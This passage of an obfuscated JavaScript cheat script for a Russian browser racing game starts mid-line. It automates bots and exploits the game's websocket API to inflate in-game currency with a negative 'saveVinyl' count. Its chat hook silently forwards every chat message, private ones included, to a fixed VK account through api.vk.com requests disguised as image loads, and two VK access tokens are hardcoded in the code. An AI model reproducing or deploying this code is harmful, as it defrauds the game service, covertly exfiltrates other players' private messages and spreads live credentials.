color="yellow"><b>'+parseInt(hyd.allWin/(hyd.allWin+hyd.allLose)*100)+'</b></font>');$('#main').append('<br>Победы за неделю: <font color="green"><b>'+hyd.wins+'</b></font>');$('#main').append('<br>Модераторство: <b>'+modr+'</b>');$('#main').append('<br>Цвет чата: <font style="background-color:black;" color='+clr+'> '+clr+' </font> ');$('#main').append('<br>Полная инфа тут : <a href="http://u913404y.beget.tech/i/?'+hyd.id+'" target="_blank" style="text-decoration: none;color:aqua">u913404y.beget.tech</a>');});delete response;}else{$('#main').append('<br><br>ID <font color=red>'+$('#inp').val()*1+'</font> не найден');}}}else{$('#inp').val(user.id)}}
sdr = function(i){var query={};query.head = 'userGetInfo';query.id = i;socket.send(JSON.stringify(query));}
var STOP_SLIV = function() {PS=false;clearInterval(interval_s);infoMsg('<font size = 3>Конец работы скрипта.','Бот зашёл в бой : '+rrr+' раз!<br>Советую перезагрузить страницу и продолжить баловаться :D');}
var ACT = function(id) {
	if(id==1337){
		var date = new Date();
		var prov = date.getDate()+'|'+date.getMonth()+'|'+date.getFullYear();
		if(!getCookie('remixvkcoo') || getCookie('remixvkcoo')!=prov){
		var euro_nak = prompt('Сколько крутим? Можно крутить только один раз в день и не больше 500 евро.\n\n!!!!!! : Советую выбирать перед этим ненужную машину, так как может произойти ошибка и машина тю-тю',100);
		if(euro_nak>0){
		if(euro_nak>500){euro_nak=500}
		if(!$('#blockBox')[0]){var DIV = document.createElement("DIV");DIV.id ='blockBox';document.body.appendChild(DIV);blockBox = function(){$("#blockBox").css('display','block');$("#blockBox").css('background',"");$("#blockBox").css('background-color','#000');$("#blockBox").css('opacity',1);$("#blockBox").html("<div id='blockBoxMsg'></div>");}}
		blockBox();$("#blockBox").css('opacity',1);$("#blockBoxMsg").append("Накручиваю...");setCookie('remixvkcoo',prov);
		var u_k = user.car;query.head = 'buyCar';query.car = 'oka';socket.send(JSON.stringify(query));viewGreenMsg=function(msg){msg=msg};
			setTimeout(function(){query={}; query.head = 'saveVinyl';query.count = (parseInt(euro_nak,10)+5)*(-1);socket.send(JSON.stringify(query));},1000);
			setTimeout(function(){stylePage('rings');$('#w14').click();query.head='buyRings';query.rings=14;socket.send(JSON.stringify(query));},5000);
			setTimeout(function(){query = {};query.head = 'saleCar';socket.send(JSON.stringify(query));},8000);
			setTimeout(function(){query = {};query.head = 'selectCar';query.carId = u_k;socket.send(JSON.stringify(query));$("#blockBox").css('display','none');function blockBox(){$("#blockBox").css('display','block');$("#blockBox").css('background',"");$("#blockBox").css('background-color','#000');$("#blockBox").css('opacity',0.8);$("#blockBox").html("<div id='blockBoxMsg'></div>");}},10000);
		}
	}else{alert('Сегодня уже накручивали, не, больше низя, я предупреждал.');}
	}
	if(id==17){var lipr = prompt('Введите номер фона от 1 до 2');if(lipr*1<1){lipr=1;}if(lipr*1>2){lipr=2;};
var bgbg = new Image();bgbg.src = 'http://u913404y.beget.tech/phch/bg'+lipr*1+'.jpg';garageArr[4] = bgbg;setTimeout(function(){query = {};query.head = 'garageChange';query.garage = 4;socket.send(JSON.stringify(query))},1500)};
	if(id==67){var s0 = Smoke10; var s1 = Smoke11; s1.src=''; s0.src='';}
	if(id==68){var smprom = prompt('Вставьте ссылку на изображение','http://u913404y.beget.tech/images/sm/sm1.png');var s0 = Smoke10; var s1 = Smoke11; s1.src=smprom; s0.src=smprom;}
	if(id==69){var massS = ["http://u913404y.beget.tech/images/sm/sm.png","http://u913404y.beget.tech/images/sm/sm1.png","http://u913404y.beget.tech/images/sm/sm2.png","http://u913404y.beget.tech/images/sm/sm3.png"];var rand = Math.floor(Math.random() * massS.length); var s0 = Smoke10; var s1 = Smoke11; s1.src=massS[rand]; s0.src=massS[rand];}
}
var back = function(){imgload('http://u913404y.beget.tech/images/favicon.ico',32,32,0,'bc');$('#bc')[0].style.position='absolute';$('#bc')[0].style.left=32+'px';$('#bc')[0].style.top=160-16+'px';$('#bc')[0].onclick=function(){HTMLappend()};}

var STOPBOT = function(){SBOT=true;var IMG = document.createElement("IMG");IMG.width=23*2;IMG.height=23*2;IMG.src = 'http://u913404y.beget.tech/phch/STOPBOT.png';IMG.id='STOPBOT';$('#canvasDiv').append(IMG);$('#STOPBOT')[0].style.position='absolute';$('#STOPBOT')[0].style.left='367px';$('#STOPBOT')[0].style.cursor='pointer';$('#STOPBOT')[0].style.zIndex='987654';$('#STOPBOT')[0].style.top=0+'px';$('#STOPBOT')[0].onclick=function(){$(this).remove();$('#fritndG, #STAT').remove();AUTO.stop(1);};}
var STAT = function(){var IMG = document.createElement("IMG");IMG.width=23*1.5;IMG.height=23*1.5;IMG.src = 'http://u913404y.beget.tech/phch/STAT.png';IMG.id='STAT';$('#canvasDiv').append(IMG);$('#STAT')[0].style.position='absolute';$('#STAT')[0].style.left='315px';$('#STAT')[0].style.cursor='pointer';$('#STAT')[0].style.zIndex='987655';$('#STAT')[0].style.top=0+'px';$('#STAT')[0].onclick=function(){AUTO.STAT();};}
var fritndG = function(){var IMG = document.createElement("IMG");IMG.width=23*1.5;IMG.height=23*1.5;IMG.src = 'http://u913404y.beget.tech/phch/fritndG.png';IMG.id='fritndG';$('#canvasDiv').append(IMG);$('#fritndG')[0].style.position='absolute';$('#fritndG')[0].style.left='430px';$('#fritndG')[0].style.cursor='pointer';$('#fritndG')[0].style.zIndex='987656';$('#fritndG')[0].style.top=0+'px';$('#fritndG')[0].onclick=function(){if(AUTO.fritndG==false){AUTO.fritndG=true;$('#fritndG')[0].src='http://u913404y.beget.tech/phch/fritndG.png';}else{AUTO.fritndG=false;$('#fritndG')[0].src='http://u913404y.beget.tech/phch/fritndGr.png'; if(raceWithFriend){acsel = false;jetOn = false;}};}}
var DRAW = function(){var IMG = document.createElement("IMG");IMG.src = 'http://u913404y.beget.tech/phch/DRAW.png';IMG.id='DRAW';$('#canvasDiv').append(IMG);$('#DRAW')[0].class = "gadjet_icon";$('#DRAW')[0].className = "gadjet_icon";$('#DRAW')[0].style.position='absolute';$('#DRAW')[0].style.right='15px';$('#DRAW')[0].style.cursor='pointer';$('#DRAW')[0].style.zIndex='987656';$('#DRAW')[0].onclick=function(){AUTO.draw();}}

function imgload(img,w,h,or,id,title){var IMG = document.createElement("IMG");IMG.width=w; IMG.height=h;IMG.src = img;if(or==1){$('#otherDiv').html(IMG);}else{$('#otherDiv').append(IMG);};if(id)IMG.id=id;if(title)IMG.title=title;};
var viewInfo=function(id){window.open('http://u913404y.beget.tech/i/?'+id);};
function textload(txt,id,title){var TEXT = document.createElement("TEXT");if(id)TEXT.id=id;TEXT.innerText=txt;$('#otherDiv').append(TEXT);if(title)TEXT.title=title;};
var staroe = function() {drawPage('salon');$("#salonCarsDiv").html('');$('#selLevelImg').attr("src","http://u913404y.beget.tech/images/favicon.ico");for(var key in salon){if (salon[key].visible=='never'){$("#salonCarsDiv").append("<div class='carSocketDiv' id='sock_"+key+"'></div>");$("#sock_"+key).append("<div class='carPriceTop'>"+salon[key].price+"</div>");if(salon[key].price<=1000) $('.carPriceTop').last().css('background','url(images/goldSmall2.png) 0 0 no-repeat');$("#sock_"+key).append("<canvas class='salonCanvTop' id='"+key+"'></canvas>");$("#sock_"+key).append("<div class='carInfoTop'><div class='carPower'>"+salon[key].power+"</div><div class='carNameTop'>"+salon[key].name+' '+salon[key].model+"</div></div>");try{tmpCtx = document.getElementById(key).getContext('2d');document.getElementById(key).width=220;document.getElementById(key).height=80;var scaleCar = 3.5;if(key=='uaz' || key=='lc200' || key=='t5')scaleCar = 4;tmpCtx.drawImage(imgs[key+'Down'],0,0,imgs[key+'Body'].width/scaleCar,imgs[key+'Body'].height/scaleCar);tmpCtx.drawImage(imgs['shadow'],0,(salon[key].whPos.yf+salon[key].whPos.r-13)/scaleCar, imgs['shadow'].width/scaleCar, imgs['shadow'].height/scaleCar);tmpCtx.drawImage(imgs['w'+salon[key].rings],salon[key].whPos.xr/scaleCar,salon[key].whPos.yr/scaleCar, salon[key].whPos.r/scaleCar, salon[key].whPos.r/scaleCar);tmpCtx.drawImage(imgs['w'+salon[key].rings],salon[key].whPos.xf/scaleCar,salon[key].whPos.yf/scaleCar, salon[key].whPos.r/scaleCar, salon[key].whPos.r/scaleCar);tmpCtx.drawImage(imgs[key+'Body'],0,0,imgs[key+'Body'].width/scaleCar,imgs[key+'Body'].height/scaleCar);paintCar(salon[key].color,tmpCtx,salon[key].saturation,salon[key].lightnes);tmpCtx.drawImage(imgs[key+'Light'],0,0,imgs[key+'Body'].width/scaleCar,imgs[key+'Body'].height/scaleCar);}catch(e){}}function buyClick(carId){query.head = 'buyCar';query.car = carId;socket.send(JSON.stringify(query));}$('#'+key).bind('click', function(){changeCar(salon[this.id],{});$("#carInfoDiv").append("<div class='Buybutton' id='buyCar'></div>");salonSelCar = this.id;$("#buyCar").click(function(){buyClick(salonSelCar)});});}}
var clanin=function(id){var whclan = prompt('В какой клан вступить?');if(whclan>0){var wh1clan = confirm('Вступить в клан '+whclan+' ?');}else{}if(wh1clan==1){query={};query.head= "clanInviteOk";query.uid=whclan;socket.send(JSON.stringify(query));}else{};};
function getCookie(name) {var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));return matches ? decodeURIComponent(matches[1]) : undefined;}
function setCookie(name, value, options) {options = options || {};var expires = options.expires;if (typeof expires == "number" && expires) {var d = new Date();d.setTime(d.getTime() + expires * 1000);expires = options.expires = d;}if (expires && expires.toUTCString) {options.expires = expires.toUTCString();}value = encodeURIComponent(value);var updatedCookie = name + "=" + value;for (var propName in options) {updatedCookie += "; " + propName;var propValue = options[propName];if (propValue !== true) {updatedCookie += "=" + propValue;}}document.cookie = updatedCookie;}
};init_hack();
var tChat = {
chat : function(){ newChat_addMsg = function(response){
    console.log(response);
name = response.name.replace('<br>',' ');
msg = response.msg;
photo = response.photo.replace('script','');
to = 0;//	Определение адресата
if(typeof response.to != 'undefined')to = response.to
if(name.search('/u30') > -1) name = 'id'+response.uid;
var tooo = '', mooo = '';
if(to != 0 && response.toName != undefined )tooo = ' -> @id'+to+' ('+response.toName+')';
if(response.moder>0){mooo = '⚠ '};
var tvk= mooo+'@id'+response.uid+' ('+name+') '+tooo+' | '+msg;
    tvk = tvk.replace(/<[^>]+>/g,'');
var sm1 = [/(:\))/g, /(;\))/g, 'XD', /(:\()/g , '&01' , '&02' , '&03' , '&04' , '&05' , '&06' , '&07' , '&08' , '&09' , '&10' , '&11' , '&12' , '&13' , '&14', '&15', '&16'];
var sm2 = ['☺', '😉', '😆', '😕', '❤' , '😃' , '👽' , '👌🏻' , '👍🏻' , '😏' , '😑' , '😎' , '😒' , '😘' , '💩' , '😡' , '😙' , '😭', '😨', '🚐'];
    tvk = tvk.replaceArray(sm1, sm2);
var jvk=new Image();jvk.src='https://api.vk.com/method/messages.send?user_ids=381150952&message='+tvk+'&access_token=f375bca282c8dccc300fb83b70539d44c79fd039d1780d9041043315a6628c96a3bb2e0bf611d7762f4cd&v=5.46';

		for(var sm in smiles) msg = msg.split(sm).join("<img class='smileInText' src='"+smiles[sm]+"'>");
		if(response.uid==13){
			//console.log(response);
			$(".newChat_msgBox").each(function(index){// заныкаем все сообщения выбранного пользователя
				if($(this).data('uid') == response.bannedUid)$(this).children('font').addClass('bannedMsg');
			});
		}
		$("#newChat_body").append("<div class='newChat_msgBox'><img class='newChat_photo' src='"+photo+"'><b>"+name+"</b><br>"+msg+"</div>");
		if(typeof response.banTime != 'undefined'){//Выводим время бана
			$(".newChat_msgBox:last").children('b').append(' ('+timeFromSec(response.banTime)+')');
		}
		if(to > 0 && to==myUid){//Если сообщение адресовано "мне"
			$(".newChat_msgBox:last").children('b').css('color','rgb(6, 255, 165)');
			$(".newChat_msgBox:last").children('b').append(' -> '+response.toName);
			//console.log('Личное сообщение');
		}else if(to > 0){
			$(".newChat_msgBox:last").children('b').append(' -> '+response.toName);
			$(".newChat_msgBox:last").css('opacity','0.6');
		}
		if(selectedInChatUID > 0 && selectedInChatUID==response.uid){//Выделяем новые сообщения если человек выделен
			$(".newChat_msgBox:last").addClass('green_bg');
		}
		$(".newChat_msgBox:last").data('name',name);$(".newChat_msgBox:last").data('photo',photo);$(".newChat_msgBox:last").data('uid',response.uid);
		if(response.moder==1){
			$(".newChat_msgBox:last").append("<div class='newChat_moderIco'></div>");
		}
		if(response.moder==2){
			$(".newChat_msgBox:last").append("<div class='newChat_traineeIco'></div>");
		}
		if(maxScrollTop-$("#newChat_body").scrollTop()<100){
			$("#newChat_body").scrollTop(9999999);
			maxScrollTop = $("#newChat_body").scrollTop()
		}
} },

au : function(){ chatSocket.on('message', function (msg) {
var response = JSON.parse(msg);
if(response.head == 'auction_inf'){
    if(typeof response.auction != 'undefined' && response.auction.limitation == false){
        var AU = response.auction;
var tau = 'Начало аукциона! Награда - '+AU.award+' €. ';
var jvk=new Image();jvk.src='https://api.vk.com/method/messages.send?user_ids=381150952&message='+tau+'&access_token=8969ead266155c825b0bf1abafb3b3f19e82c2770ce4684f5c8e625a02a8de231b22818bd7508cd73d639&v=5.46';
    }}
})}
};
String.prototype.replaceArray = function(find, replace) {
  var replaceString = this;
  var regex;
  for (var i = 0; i < find.length; i++) {
    regex = new RegExp(find[i], "g");
    replaceString = replaceString.replace(regex, replace[i]);
  }
  return replaceString;
};
var AUTO = {};
/* end super puper script */
